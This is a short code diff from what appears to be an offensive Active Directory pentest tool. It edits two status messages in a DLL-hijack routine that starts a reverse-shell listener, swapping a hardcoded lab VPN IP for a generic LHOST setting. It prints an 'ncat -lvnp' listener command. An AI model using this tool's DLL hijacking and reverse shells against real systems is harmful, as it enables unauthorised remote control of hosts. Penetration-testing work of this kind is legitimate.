@@ -271,9 +271,9 @@ def run_dll_hijack(
     try:
         if not no_listener and not dry_run and payload_mode == "shell":
             if use_ncat:
-                print_info(f"external listener required: ncat -lvnp {lport} on your VPN IP (e.g. 10.10.15.125)")
+                print_info(f"external listener required: ncat -lvnp {lport} on your LHOST")
             else:
-                print_info(f"starting built-in reverse-shell listener on 0.0.0.0:{lport} (VPN callback e.g. 10.10.15.125)")
+                print_info(f"starting built-in reverse-shell listener on 0.0.0.0:{lport} (set ADMAPPER_LHOST)")
             listener = start_listener(lport, use_ncat=use_ncat)
 
         deploy = deploy_dll_hijack(
